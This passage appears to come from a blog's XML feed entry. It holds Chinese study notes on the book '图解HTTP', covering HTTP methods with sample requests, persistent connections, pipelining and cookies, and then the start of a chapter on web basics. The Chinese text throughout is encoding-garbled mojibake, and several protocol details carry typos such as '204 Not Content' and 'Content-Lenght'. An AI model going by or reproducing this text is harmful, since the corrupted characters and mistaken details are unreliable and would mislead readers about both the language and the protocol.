è¾“å®žä½“ä¸»ä½“POSTæ–¹æ³•ç”¨æ¥ä¼ è¾“å®žä½“çš„ä¸»ä½“ è™½ç„¶ç”¨GETæ–¹æ³•ä¹Ÿå¯ä»¥ä¼ è¾“å®žä½“çš„ä¸»ä½“ï¼Œä½†ä¸€èˆ¬ä¸ç”¨GETæ–¹æ³•è¿›è¡Œä¼ è¾“ï¼Œè€Œç”¨POSTæ–¹æ³•ã€‚è™½è¯´POSTçš„åŠŸèƒ½ä¸ŽGETå¾ˆç›¸ä¼¼ï¼Œä½†POSTçš„ä¸»è¦ç›®çš„å¹¶ä¸æ˜¯èŽ·å–å“åº”çš„ä¸»ä½“å†…å®¹ã€‚ ä½¿ç”¨POSTæ–¹æ³•çš„è¯·æ±‚å“åº”çš„ä¾‹å­ çŠ¶æ€ æè¿° è¯·æ±‚ POST /submit.cgi HTTP/1.1Host: www.hackr.jpContent-Length:1560ï¼ˆ1560å­—èŠ‚çš„æ•°æ®ï¼‰ å“åº” è¿”å›žsubmit.cgiæŽ¥å—æ•°æ®çš„å¤„ç†ç»“æžœ PUT: ä¼ è¾“æ–‡ä»¶PUTæ–¹æ³•ç”¨æ¥ä¼ è¾“æ–‡ä»¶ã€‚å°±åƒFTPåè®®çš„æ–‡ä»¶ä¸Šä¼ ä¸€æ ·ï¼Œè¦æ±‚åœ¨è¯·æ±‚æŠ¥æ–‡çš„ä¸»ä½“ä¸­åŒ…å«æ–‡ä»¶å†…å®¹ï¼Œç„¶åŽä¿å­˜åˆ°è¯·æ±‚URIæŒ‡å®šçš„ä½ç½®ã€‚ ä½†æ˜¯é‰´äºŽHTTP/1.1çš„PUTæ–¹æ³•è‡ªèº«ä¸å¸¦éªŒè¯æœºåˆ¶ï¼Œä»»ä½•äººéƒ½å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œå­˜åœ¨å®‰å…¨æ€§é—®é¢˜ï¼Œå› æ­¤ä¸€èˆ¬çš„Webç½‘ç«™ä¸ä½¿ç”¨è¯¥æ–¹æ³•ã€‚è‹¥é…åˆWebåº”ç”¨ç¨‹åºçš„éªŒè¯æœºåˆ¶ï¼Œæˆ–æž¶æž„è®¾è®¡é‡‡ç”¨REST(REpresentational State Transfer,è¡¨å¾çŠ¶æ€è½¬ç§»)æ ‡å‡†çš„åŒç±»Webç½‘ç»œï¼Œå°±å¯èƒ½ä¼šå¼€æ”¾ä½¿ç”¨PUTæ–¹æ³• ä½¿ç”¨PUTæ–¹æ³•çš„è¯·æ±‚å“åº”çš„ä¾‹å­ çŠ¶æ€ æè¿° è¯·æ±‚ PUT/example.html HTTP/1.1Host: www.hackr.jpContent-Type: text/htmlContent-Lenght: 1560ï¼ˆ1560å­—èŠ‚çš„æ•°æ®ï¼‰ å“åº”ï¼ˆè¯·æ±‚æ‰§è¡ŒæˆåŠŸäº†ï¼Œä½†æ²¡æœ‰æ•°æ®è¿”å›žï¼‰ å“åº”è¿”å›žçŠ¶æ€ç 204 Not Content(æ¯”å¦‚ï¼šè¯¥htmlå·²å­˜åœ¨äºŽæœåŠ¡å™¨ä¸Š) HEAD: èŽ·å¾—æŠ¥æ–‡é¦–éƒ¨HEADæ–¹æ³•å’ŒGETæ–¹æ³•ä¸€æ ·ï¼Œåªæ˜¯ä¸è¿”å›žæŠ¥æ–‡ä¸»ä½“éƒ¨åˆ†ã€‚ç”¨äºŽç¡®è®¤URIçš„æœ‰æ•ˆæ€§ä»¥åŠèµ„æºæ›´æ–°çš„æ—¥æœŸæ—¶é—´ç­‰ã€‚ ä½¿ç”¨HEADæ–¹æ³•çš„è¯·æ±‚å“åº”çš„ä¾‹å­ çŠ¶æ€ æè¿° è¯·æ±‚ HEAD /index.html HTTP/1.1Host: www.hackr.jp å“åº” è¿”å›ž index.html æœ‰å…³çš„å“åº”é¦–éƒ¨ DELETE: åˆ é™¤æ–‡ä»¶DELETEæ–¹æ³•ç”¨æ¥åˆ é™¤æ–‡ä»¶ï¼Œæ˜¯ä¸ŽPUTç›¸åçš„æ–¹æ³•ã€‚DELETEæ–¹æ³•æŒ‰è¯·æ±‚URIåˆ é™¤æŒ‡å®šçš„èµ„æºã€‚ä½†æ˜¯ï¼ŒHTTP/1.1çš„DELETEæ–¹æ³•æœ¬èº«å’ŒPUTæ–¹æ³•ä¸€æ ·ä¸å¸¦éªŒè¯æœºåˆ¶ï¼Œæ‰€ä»¥ä¸€èˆ¬çš„Webç½‘ç«™ä¹Ÿä¸ä½¿ç”¨DELETEæ–¹æ³•ã€‚å½“é…åˆWebåº”ç”¨ç¨‹åºçš„éªŒè¯æœºåˆ¶ï¼Œæˆ–éµå®ˆRESTæ ‡å‡†æ—¶è¿˜æ˜¯æœ‰å¯èƒ½ä¼šå¼€æ”¾ä½¿ç”¨çš„ã€‚ ä½¿ç”¨DELETEæ–¹æ³•çš„è¯·æ±‚å“åº”çš„ä¾‹å­ çŠ¶æ€ æè¿° è¯·æ±‚ DELETE /example.html HTTP/1.1Host: www.hackr.jp å“åº” å“åº”è¿”å›žçŠ¶æ€ç 204 Not Content(æ¯”å¦‚ï¼šè¯¥htmlå·²ä»ŽæœåŠ¡å™¨ä¸Šåˆ é™¤) OPTIONS: è¯¢é—®æ”¯æŒçš„æ–¹æ³•OPTIONSæ–¹æ³•ç”¨æ¥æŸ¥è¯¢é’ˆå¯¹è¯·æ±‚URIæŒ‡å®šçš„èµ„æºæ”¯æŒçš„æ–¹æ³• ä½¿ç”¨OPTIONSæ–¹æ³•çš„è¯·æ±‚å“åº”çš„ä¾‹å­ çŠ¶æ€ æè¿° è¯·æ±‚ OPTIONS HTTP/1.1Host: www.hackr.jp å“åº” HTTP/1.1 200 OKAllow: GET,POST,HEAD,OPTIONSï¼ˆè¿”å›žæœåŠ¡å™¨æ”¯æŒçš„æ–¹æ³•ï¼‰ Trace: è¿½è¸ªè·¯å¾„TRACEæ–¹æ³•æ˜¯è®©WebæœåŠ¡å™¨ç«¯å°†ä¹‹å‰çš„è¯·æ±‚é€šä¿¡çŽ¯å›žå®¢æˆ·ç«¯çš„æ–¹æ³•ã€‚ å‘é€è¯·æ±‚æ—¶ï¼Œåœ¨Max-Forwardsé¦–éƒ¨å­—æ®µä¸­å¡«å…¥æ•°å€¼ï¼Œæ¯ç»è¿‡ä¸€ä¸ªæœåŠ¡å™¨ç«¯å°±å°†æ•°å­—å‡1ï¼Œå½“æ•°å€¼åˆšå¥½å‡åˆ°0æ—¶ï¼Œå°±åœæ­¢ç»§ç»­ä¼ è¾“ï¼Œæœ€åŽæŽ¥å—è¯·æ±‚çš„æœåŠ¡å™¨ç«¯åˆ™å¯ä»¥è¿”å›žçŠ¶æ€ç 200 OK çš„å“åº” å®¢æˆ·ç«¯é€šè¿‡TRACEæ–¹æ³•å¯ä»¥æŸ¥è¯¢å‘é€å‡ºåŽ»çš„è¯·æ±‚æ˜¯æ€Žä¹ˆæ ·è¢«åŠ å·¥ä¿®æ”¹/ç¯¡æ”¹çš„ã€‚è¿™æ˜¯å› ä¸ºï¼Œè¯·æ±‚æƒ³è¦è¿žæŽ¥åˆ°æºç›®æ ‡æœåŠ¡å™¨å¯èƒ½ä¼šé€šè¿‡ä»£ç†ä¸­è½¬ã€‚TRACEæ–¹æ³•å°±æ˜¯ç”¨æ¥ç¡®è®¤è¿žæŽ¥è¿‡ç¨‹ä¸­å‘ç”Ÿçš„ä¸€ç³»åˆ—æ“ä½œã€‚ ä½†æ˜¯ï¼ŒTRACEæ–¹æ³•æœ¬æ¥å°±ä¸æ€Žä¹ˆå¸¸ç”¨ï¼Œå†åŠ ä¸Šå®ƒå®¹æ˜“å¼•å‘XST(Cross-Site Tracing,è·¨åŸŸè¿½è¸ª)æ”»å‡»ï¼Œé€šå¸¸å°±æ›´ä¸ä¼šç”¨åˆ°äº†ã€‚ ä½¿ç”¨TRACEæ–¹æ³•çš„è¯·æ±‚å“åº”çš„ä¾‹å­ çŠ¶æ€ æè¿° è¯·æ±‚ TRACE HTTP/1.1Host: www.hackr.jp Max-Forwards: 2 å“åº” HTTP/1.1 200 OKContent-Type: messgae/httpTRACE HTTP/1.1Host: www.hackr.jp Max-Forwards: 2 CONNECT: è¦æ±‚ç”¨éš§é“åè®®è¿žæŽ¥ä»£ç†CONNECT æ–¹æ³•è¦æ±‚ä¸Žä»£ç†æœåŠ¡å™¨é€šä¿¡å»ºç«‹éš§é“ï¼Œå®žçŽ°éš§é“åè®®è¿›è¡ŒTCPé€šä¿¡ã€‚ä¸»è¦ä½¿ç”¨SSLï¼ˆSecure Sockets Layer,å®‰å…¨å¥—æŽ¥å±‚ï¼‰å’ŒTLS(Transport Layer Security,ä¼ è¾“å±‚å®‰å…¨)åè®®æŠŠé€šä¿¡å†…å®¹åŠ å¯†åŽç»ç½‘ç»œéš§é“ä¼ è¾“ CONNECTæ–¹æ³•çš„æ ¼å¼å¦‚ä¸‹æ‰€ç¤º 1CONNECT ä»£ç†æœåŠ¡å™¨åï¼š ç«¯å£å HTTPç‰ˆæœ¬ ä½¿ç”¨CONNECTæ–¹æ³•çš„è¯·æ±‚å“åº”çš„ä¾‹å­ çŠ¶æ€ æè¿° è¯·æ±‚ CONNECT proxy.hackr.jp:8080 HTTP/1.1Host: www.hackr.jp å“åº” HTTP/1.1 200 OK (ä¹‹åŽè¿›å…¥ç½‘ç»œéš§é“) ä½¿ç”¨æ–¹æ³•ä¸‹è¾¾å‘½ä»¤æƒ³è¯·æ±‚URIæŒ‡å®šçš„èµ„æºå‘é€è¯·æ±‚æŠ¥æ–‡æ—¶ï¼Œé‡‡ç”¨ç§°ä¸ºæ–¹æ³•çš„å‘½ä»¤ã€‚ æ–¹æ³•çš„ä½œç”¨ç”¨äºŽï¼Œå¯ä»¥æŒ‡å®šè¯·æ±‚çš„èµ„æºæŒ‰æœŸæœ›äº§ç”Ÿçš„æŸç§è¡Œä¸ºã€‚æ–¹æ³•ä¸­æœ‰GETã€POSTã€HEADç­‰ ä¸‹è¡¨åˆ—å‡ºäº†HTTP/1.0 å’Œ HTTP/1.1æ”¯æŒçš„æ–¹æ³•ã€‚å¦å¤–ï¼Œæ–¹æ³•ååŒºåˆ«å¤§å°å†™ï¼Œæ³¨æ„ç”¨å¤§å†™å­—æ¯ æ–¹æ³• è¯´æ˜Ž æ”¯æŒçš„HTTPåè®®ç‰ˆæœ¬ GET èŽ·å–èµ„æº 1.0ã€1.1 POST ä¼ è¾“å®žä½“ä¸»ä½“ 1.0ã€1.1 PUT ä¼ è¾“æ–‡ä»¶ 1.0ã€1.1 HEAD èŽ·å¾—æŠ¥æ–‡é¦–éƒ¨ 1.0ã€1.1 DELETE åˆ é™¤æ–‡ä»¶ 1.0ã€1.1 OPTIONS è¯¢é—®æ”¯æŒçš„æ–¹æ³• 1.1 TRACE è¿½è¸ªè·¯å¾„ 1.1 CONNECT è¦æ±‚ç”¨éš§é“åè®®è¿žæŽ¥ä»£ç† 1.1 LINK å»ºç«‹å’Œèµ„æºä¹‹é—´çš„è”ç³» 1.0 UNLINK æ–­å¼€è¿žæŽ¥å…³ç³» 1.0 åœ¨è¿™é‡Œåˆ—ä¸¾çš„ä¼—å¤šæ–¹æ³•ä¸­ï¼ŒLINKå’ŒUNLINKå·²è¢«HTTP/1.1åºŸå¼ƒï¼Œä¸å†æ”¯æŒ æŒä¹…è¿žæŽ¥èŠ‚çœé€šä¿¡é‡HTTPåè®®çš„åˆå§‹ç‰ˆæœ¬ä¸­ï¼Œæ¯è¿›è¡Œä¸€æ¬¡HTTPé€šä¿¡å°±è¦æ–­å¼€ä¸€æ¬¡TCPè¿žæŽ¥ã€‚ ä»¥å½“å¹´çš„é€šä¿¡æƒ…å†µæ¥è¯´ï¼Œå› ä¸ºéƒ½æ˜¯äº›å®¹é‡å¾ˆå°çš„æ–‡æœ¬ä¼ è¾“ï¼Œæ‰€ä»¥å³ä½¿è¿™æ ·çš„ä¹Ÿæ²¡æœ‰å¤šå¤§é—®é¢˜ã€‚å¯éšç€HTTPçš„æ™®åŠï¼Œæ–‡æ¡£ä¸­åŒ…å«ç€å¤§é‡å›¾ç‰‡çš„æƒ…å†µå¤šäº†èµ·æ¥ã€‚æ¯”å¦‚ï¼Œä½¿ç”¨æµè§ˆå™¨æµè§ˆä¸€ä¸ªåŒ…å«å¤šå¼ å›¾ç‰‡çš„HTMLé¡µé¢æ—¶ï¼Œåœ¨å‘é€è¯·æ±‚è®¿é—®HTMLé¡µé¢èµ„æºçš„åŒæ—¶ï¼Œä¹Ÿä¼šè¯·æ±‚è¯¥HTMLé¡µé¢é‡ŒåŒ…å«çš„å…¶ä»–èµ„æºã€‚å› æ­¤ï¼Œæ¯æ¬¡çš„è¯·æ±‚éƒ½ä¼šé€ æˆæ— è°“çš„TCPè¿žæŽ¥å»ºç«‹å’Œæ–­å¼€ï¼Œå¢žåŠ é€šä¿¡é‡çš„å¼€é”€ã€‚ æŒä¹…è¿žæŽ¥ä¸ºäº†è§£å†³ä¸Šè¿°TCPè¿žæŽ¥çš„é—®é¢˜ï¼ŒHTTP/1.1å’Œä¸€éƒ¨åˆ†çš„HTTP/1.0æƒ³å‡ºäº†æŒä¹…è¿žæŽ¥ï¼ˆHTTP Persistent Connections,ä¹Ÿç§°ä¸ºHTTP keep-aliveæˆ–HTTP connection reuseï¼‰çš„æ–¹æ³•ã€‚æŒä¹…è¿žæŽ¥çš„ç‰¹ç‚¹æ˜¯ï¼Œåªè¦ä»»æ„ä¸€ç«¯æ²¡æœ‰æ˜Žç¡®æå‡ºæ–­å¼€è¿žæŽ¥ï¼Œåˆ™ä¿æŒTCPè¿žæŽ¥çŠ¶æ€ã€‚ æŒä¹…è¿žæŽ¥æ—¨åœ¨å»ºç«‹1æ¬¡TCPè¿žæŽ¥åŽè¿›è¡Œå¤šæ¬¡è¯·æ±‚å’Œå“åº”çš„äº¤äº’ã€‚æŒä¹…è¿žæŽ¥çš„å¥½å¤„åœ¨äºŽå‡å°‘TCPè¿žæŽ¥çš„é‡å¤å»ºç«‹å’Œæ–­å¼€æ‰€é€ æˆçš„é¢å¤–å¼€é”€ï¼Œå‡è½»äº†æœåŠ¡å™¨ç«¯çš„è´Ÿè½½ã€‚å¦å¤–ï¼Œå‡å°‘å¼€é”€çš„é‚£éƒ¨åˆ†æ—¶é—´ï¼Œä½¿å¾—HTTPè¯·æ±‚å’Œå“åº”èƒ½å¤Ÿæ›´æ—©åœ°ç»“æŸï¼Œè¿™æ ·Webé¡µé¢çš„æ˜¾ç¤ºé€Ÿåº¦ä¹Ÿå°±ç›¸åº”æé«˜äº†ã€‚ åœ¨HTTP/1.1ä¸­ï¼Œæ‰€æœ‰çš„è¿žæŽ¥é»˜è®¤éƒ½æ˜¯æŒä¹…è¿žæŽ¥ï¼Œä½†åœ¨HTTP/1.0å†…å¹¶æœªæ ‡å‡†åŒ–ã€‚è™½ç„¶æœ‰ä¸€éƒ¨åˆ†æœåŠ¡å™¨é€šè¿‡éžæ ‡å‡†çš„æ‰‹æ®µå®žçŽ°äº†æŒä¹…è¿žæŽ¥ï¼Œä½†æœåŠ¡å™¨ç«¯ä¸ä¸€å®šèƒ½å¤Ÿæ”¯æŒæŒä¹…è¿žæŽ¥ã€‚æ¯«æ— ç–‘é—®ï¼Œé™¤äº†æœåŠ¡å™¨ç«¯ï¼Œå®¢æˆ·ç«¯ä¹Ÿéœ€è¦æ”¯æŒæŒä¹…è¿žæŽ¥ã€‚ ç®¡çº¿åŒ–æŒä¹…è¿žæŽ¥ä½¿å¾—å¤šæ¬¡è¯·æ±‚ä»¥ç®¡çº¿åŒ–ï¼ˆpipeliningï¼‰æ–¹å¼å‘é€æˆä¸ºå¯èƒ½ã€‚ä»Žå‰å‘é€è¯·æ±‚åŽéœ€ç­‰å¾…å¹¶æ”¶åˆ°å“åº”ï¼Œæ‰èƒ½å‘é€ä¸‹ä¸€ä¸ªè¯·æ±‚ã€‚ç®¡çº¿åŒ–æŠ€æœ¯å‡ºçŽ°åŽï¼Œä¸ç”¨ç­‰å¾…å“åº”äº¦å¯ç›´æŽ¥å‘é€ä¸‹ä¸€ä¸ªè¯·æ±‚ã€‚è¿™æ ·èƒ½å¤Ÿåšåˆ°åŒæ—¶å¹¶è¡Œå‘é€å¤šä¸ªè¯·æ±‚ï¼Œè€Œä¸éœ€è¦ä¸€ä¸ªæŽ¥ä¸€ä¸ªåœ°ç­‰å¾…å“åº”äº†ã€‚ æ¯”å¦‚ï¼šå½“è¯·æ±‚ä¸€ä¸ªåŒ…å«10å¼ å›¾ç‰‡çš„HTML Webé¡µé¢ï¼Œä¸ŽæŒ¨ä¸ªè¿žæŽ¥ç›¸æ¯”ï¼Œç”¨æŒä¹…è¿žæŽ¥å¯ä»¥è®©è¯·æ±‚æ›´å¿«ç»“æŸã€‚è€Œç®¡çº¿åŒ–æŠ€æœ¯åˆ™æ¯”æŒä¹…è¿žæŽ¥è¿˜è¦å¿«ã€‚è¯·æ±‚æ¬¡æ•°è¶Šå¤šï¼Œæ—¶é—´å·®å°±è¶Šæ˜Žæ˜¾ã€‚ ä½¿ç”¨ Cookie çš„çŠ¶æ€ç®¡ç†HTTPæ˜¯æ— çŠ¶æ€åè®®ï¼Œå®ƒä¸å¯¹ä¹‹å‰å‘ç”Ÿè¿‡çš„è¯·æ±‚å’Œå“åº”çš„çŠ¶æ€è¿›è¡Œç®¡ç†ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ— æ³•æ ¹æ®ä¹‹å‰çš„çŠ¶æ€è¿›è¡Œæœ¬æ¬¡çš„è¯·æ±‚å¤„ç†ã€‚ å‡è®¾è¦æ±‚ç™»å½•è®¤è¯çš„Webé¡µé¢æœ¬èº«æ— æ³•è¿›è¡ŒçŠ¶æ€çš„ç®¡ç†ï¼ˆä¸è®°å½•å·²ç™»å½•çš„çŠ¶æ€ï¼‰ï¼Œé‚£ä¹ˆæ¯æ¬¡è·³è½¬æ–°é¡µé¢ä¸æ˜¯å†æ¬¡ç™»å½•ï¼Œå°±æ˜¯è¦åœ¨æ¯æ¬¡è¯·æ±‚æŠ¥æ–‡ä¸­é™„åŠ å‚æ•°æ¥ç®¡ç†ç™»å½•çŠ¶æ€ã€‚ ä¸å¯å¦è®¤ï¼Œæ— çŠ¶æ€åè®®å½“ç„¶ä¹Ÿæœ‰å®ƒçš„ä¼˜ç‚¹ï¼Œç”±äºŽä¸å¿…ä¿å­˜çŠ¶æ€ï¼Œè‡ªç„¶å¯å‡å°‘æœåŠ¡å™¨çš„CPUä»¥åŠå†…å­˜èµ„æºçš„æ¶ˆè€—ã€‚ä»Žå¦ä¸€ä¸ªä¾§é¢æ¥è¯´ï¼Œä¹Ÿæ­£æ˜¯HTTPåè®®æœ¬èº«æ˜¯éžå¸¸ç®€å•çš„ï¼Œæ‰€ä»¥æ‰ä¼šè¢«åº”ç”¨åˆ°å„ç§åœºæ™¯é‡Œé¢ã€‚å¦‚æžœè®©æœåŠ¡å™¨ç®¡ç†å…¨éƒ¨å®¢æˆ·ç«¯çŠ¶æ€ä¼šå˜æˆè´Ÿæ‹…ã€‚ ä¿ç•™æ— çŠ¶æ€è¿™ä¸ªç‰¹å¾çš„åŒæ—¶åˆè¦è§£å†³ç±»ä¼¼çš„çŸ›ç›¾é—®é¢˜ï¼ŒäºŽæ˜¯å¼•å…¥äº†CookieæŠ€æœ¯ã€‚CookieæŠ€æœ¯é€šè¿‡åœ¨è¯·æ±‚å’Œå“åº”æŠ¥æ–‡ä¸­å†™å…¥äº†Cookieä¿¡æ¯æ¥æŽ§åˆ¶å®¢æˆ·ç«¯çš„çŠ¶æ€ã€‚ Cookieä¼šæ ¹æ®ä»ŽæœåŠ¡ç«¯å‘é€çš„å“åº”æŠ¥æ–‡å†…çš„ä¸€ä¸ªå«åšSet-Cookieçš„é¦–éƒ¨å­—æ®µæ¶ˆæ¯ï¼Œé€šçŸ¥å®¢æˆ·ç«¯ä¿å­˜Cookieã€‚å½“ä¸‹æ¬¡å®¢æˆ·ç«¯å†æ¬¡å¾€æœåŠ¡å™¨å‘é€è¯·æ±‚æ—¶ï¼Œå®¢æˆ·ç«¯ä¼šè‡ªåŠ¨åœ¨è¯·æ±‚æŠ¥æ–‡ä¸­åŠ å…¥CookieåŽå‘å‡ºåŽ»ã€‚ æœåŠ¡å™¨ç«¯å‘çŽ°å®¢æˆ·ç«¯å‘é€æ¥çš„CookieåŽï¼Œä¼šåŽ»æ£€æŸ¥ç©¶ç«Ÿæ˜¯ä»Žå“ªä¸€ä¸ªå®¢æˆ·ç«¯å‘é€çš„è¿žæŽ¥è¯·æ±‚ï¼Œç„¶åŽæ¯”å¯¹æœåŠ¡å™¨ç«¯ä¸Šçš„è®°å½•ï¼Œæœ€åŽå¾—åˆ°ä¹‹å‰çš„çŠ¶æ€æ¶ˆæ¯ã€‚ æ²¡æœ‰ Cookieæ¶ˆæ¯çŠ¶æ€ä¸‹çš„è¯·æ±‚ ç¬¬ 2 æ¬¡ä»¥åŽï¼ˆå­˜æœ‰ Cookie ä¿¡æ¯çŠ¶æ€ï¼‰çš„è¯·æ±‚ ä¸Šå›¾å±•ç¤ºäº†å‘ç”ŸCookieäº¤äº’çš„æƒ…æ™¯ï¼ŒHTTPè¯·æ±‚æŠ¥æ–‡å’Œå“åº”æŠ¥æ–‡çš„å†…å®¹å¦‚ä¸‹ã€‚ è¯·æ±‚æŠ¥æ–‡ï¼ˆæ²¡æœ‰Cookieæ¶ˆæ¯çš„çŠ¶æ€ï¼‰ 123GET / reader / HTTP/1.1Host: hark.jp*é¦–éƒ¨å­—æ®µå†…æ²¡æœ‰Cookieç›¸å…³æ¶ˆæ¯ å“åº”æŠ¥æ–‡ï¼ˆæœåŠ¡å™¨ç«¯ç”ŸæˆCookieæ¶ˆæ¯ï¼‰ 1234HTTP/1.1 200 OKDate:Date: Thu, 12 Jul 2012 07:12:20 GMTServer: Apacheï¼œSet-Cookie: sid=1342077140226724; path=/; expires=Wed,10-Oct-12 07:12:20 GMTï¼žContent-Type: text/plain; charset=UTF-8 è¯·æ±‚æŠ¥æ–‡ï¼ˆè‡ªåŠ¨å‘é€ä¿å­˜ç€çš„Cookieæ¶ˆæ¯ï¼‰ 123GET /image/ HTTP/1.1Host: hackr.jpCookie: sid = 1342077140226724 å‚è€ƒé“¾æŽ¥ï¼šhttps://book.douban.com/subject/25863515/]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±å…¥æµ…å‡ºHTTPï¼Œä»Žå¼€å§‹åˆ°æ”¾å¼ƒï¼ˆç¬¬ä¸€ç« ï¼‰â€”â€” äº†è§£Webç½‘ç»œåŸºç¡€]]></title>
    <url>%2F2018-08-09-read-%E5%9B%BE%E8%A7%A3HTTP-Part1.html</url>
    <content type="text"><![CDATA[è¿‘æ¥åœ¨ç­‰å¾…åŽå°ç»™æŽ¥å£ï¼Œé—²æ¥æ— äº‹é‡æ–°å›žé¡¾äº†httpæ–¹é¢çš„çŸ¥è¯†ï¼Œè¯»å¤§å®¶æ´¥æ´¥ä¹é“çš„ã€Šå›¾è§£HTTPã€‹ï¼Œå°†å…¶ä¸­å¤§éƒ¨åˆ†å†…å®¹é€šè¿‡æ‰‹æ‰“æ¥åŠ æ·±å°è±¡ã€‚ ç¬¬ä¸€ç«  äº†è§£Webç½‘ç»œåŸºç¡€ä½¿ç”¨HTTPåè®®è®¿é—®Webä½ çŸ¥é“å½“æˆ‘ä»¬åœ¨ç½‘é¡µæµè§ˆå™¨ï¼ˆWeb browserï¼‰çš„åœ°å€æ ä¸­è¾“å…¥ URLæ—¶ï¼ŒWeb é¡µé¢æ˜¯å¦‚ä½•å‘ˆçŽ°çš„å—ï¼Ÿ Web é¡µé¢å½“ç„¶ä¸èƒ½å‡­ç©ºæ˜¾ç¤ºå‡ºæ¥ã€‚æ ¹æ® Web æµè§ˆå™¨åœ°å€æ ä¸­æŒ‡å®šçš„URLï¼ŒWeb æµè§ˆå™¨ä»Ž Web æœåŠ¡å™¨ç«¯èŽ·å–æ–‡ä»¶èµ„æºï¼ˆresourceï¼‰ç­‰ä¿¡æ¯ï¼Œä»Žè€Œæ˜¾ç¤ºå‡º Web é¡µé¢ã€‚åƒè¿™ç§é€šè¿‡å‘é€è¯·æ±‚èŽ·å–æœåŠ¡å™¨èµ„æºçš„ Web æµè§ˆå™¨ç­‰ï¼Œéƒ½ç§°ä¸ºå®¢æˆ·ç«¯ï¼ˆclientï¼‰ã€‚ 12345é€šè¿‡åˆ¶å®šçš„è®¿é—®åœ°å€èŽ·å–ï¼ˆæˆ–ä¸Šä¼ ï¼‰æœåŠ¡å™¨èµ„æºï¼ˆæ–‡ä»¶ç­‰ä¿¡æ¯ï¼‰ â€”â€”â€”â€”â€”â€”â€”â€”â€” ------------------&gt; â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” | å®¢æˆ·ç«¯ | | æœåŠ¡å™¨ | â€”â€”â€”â€”â€”â€”â€”â€”â€” &lt;------------------ â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” ä½¿ç”¨HTTPåè®®çš„é€šä¿¡ Web ä½¿ç”¨ä¸€ç§åä¸º HTTPï¼ˆHyperText Transfer Protocolï¼Œè¶…æ–‡æœ¬ä¼ è¾“åè®® 1 ï¼‰çš„åè®®ä½œä¸ºè§„èŒƒï¼Œå®Œæˆä»Žå®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨ç«¯ç­‰ä¸€ç³»åˆ—è¿ä½œæµã€‚è€Œåè®®æ˜¯æŒ‡è§„åˆ™çš„çº¦å®šã€‚å¯ä»¥è¯´ï¼ŒWeb æ˜¯å»ºç«‹åœ¨ HTTP åè®®ä¸Šé€šä¿¡çš„ã€‚ HTTPçš„è¯žç”Ÿ1989 å¹´ 3 æœˆï¼Œäº’è”ç½‘è¿˜åªå±žäºŽå°‘æ•°äººã€‚åœ¨è¿™ä¸€äº’è”ç½‘çš„é»Žæ˜ŽæœŸï¼ŒHTTP è¯žç”Ÿäº†ã€‚ CERNï¼ˆæ¬§æ´²æ ¸å­ç ”ç©¶ç»„ç»‡ï¼‰çš„è’‚å§† â€¢ ä¼¯çº³æ–¯ - æŽï¼ˆTim BernersLeeï¼‰åšå£«æå‡ºäº†ä¸€ç§èƒ½è®©è¿œéš”ä¸¤åœ°çš„ç ”ç©¶è€…ä»¬å…±äº«çŸ¥è¯†çš„è®¾æƒ³ã€‚æœ€åˆè®¾æƒ³çš„åŸºæœ¬ç†å¿µæ˜¯ï¼šå€ŸåŠ©å¤šæ–‡æ¡£ä¹‹é—´ç›¸äº’å…³è”å½¢æˆçš„è¶…æ–‡æœ¬ï¼ˆHyperTextï¼‰ï¼Œè¿žæˆå¯ç›¸äº’å‚é˜…çš„ WWWï¼ˆWorld Wide Webï¼Œä¸‡ç»´ç½‘ï¼‰ã€‚çŽ°åœ¨å·²æå‡ºäº† 3 é¡¹ WWW æž„å»ºæŠ€æœ¯ï¼Œåˆ†åˆ«æ˜¯ï¼šæŠŠ SGMLï¼ˆStandardGeneralized Markup Languageï¼Œæ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€ï¼‰ä½œä¸ºé¡µé¢çš„æ–‡æœ¬æ ‡è®°è¯­è¨€çš„ HTMLï¼ˆHyperText Markup Languageï¼Œè¶…æ–‡æœ¬æ ‡è®°è¯­è¨€ï¼‰ï¼›ä½œä¸ºæ–‡æ¡£ä¼ é€’åè®®çš„ HTTP ï¼›æŒ‡å®šæ–‡æ¡£æ‰€åœ¨åœ°å€çš„ URLï¼ˆUniform12Resource Locatorï¼Œç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼‰ã€‚WWW è¿™ä¸€ç§°ï¼Œæ˜¯ Web æµè§ˆå™¨å½“å¹´ç”¨æ¥æµè§ˆè¶…æ–‡æœ¬çš„å®¢æˆ·ç«¯åº”ç”¨ç¨‹åºæ—¶çš„åç§°ã€‚çŽ°åœ¨åˆ™ç”¨æ¥è¡¨ç¤ºè¿™ä¸€ç³»åˆ—çš„é›†åˆï¼Œä¹Ÿå¯ç®€ç§°ä¸º Webã€‚ Web æˆé•¿æ—¶ä»£1990 å¹´ 11 æœˆï¼ŒCERN æˆåŠŸç ”å‘äº†ä¸–ç•Œä¸Šç¬¬ä¸€å° Web æœåŠ¡å™¨å’Œ Web æµè§ˆå™¨ã€‚ä¸¤å¹´åŽçš„ 1992 å¹´ 9 æœˆï¼Œæ—¥æœ¬ç¬¬ä¸€ä¸ªç½‘ç«™çš„ä¸»é¡µä¸Šçº¿äº†ã€‚æ—¥æœ¬ç¬¬ä¸€ä¸ªä¸»é¡µ http://www.ibarakiken.gr.jp/www/ 1990 å¹´ï¼Œå¤§å®¶é’ˆå¯¹ HTML 1.0 è‰æ¡ˆè¿›è¡Œäº†è®¨è®ºï¼Œå›  HTML 1.0 ä¸­å­˜åœ¨å¤šå¤„æ¨¡ç³Šä¸æ¸…çš„éƒ¨åˆ†ï¼Œè‰æ¡ˆè¢«ç›´æŽ¥åºŸå¼ƒäº†ã€‚HTML1.0 http://www.w3.org/MarkUp/draft-ietf-iiir-html-01.txt 1993 å¹´ 1 æœˆï¼ŒçŽ°ä»£æµè§ˆå™¨çš„ç¥–å…ˆ NCSAï¼ˆNational Center forSupercomputer Applicationsï¼Œç¾Žå›½å›½å®¶è¶…çº§è®¡ç®—æœºåº”ç”¨ä¸­å¿ƒï¼‰ç ”å‘çš„Mosaic é—®ä¸–äº†ã€‚å®ƒä»¥ in-lineï¼ˆå†…è”ï¼‰ç­‰å½¢å¼æ˜¾ç¤º HTML 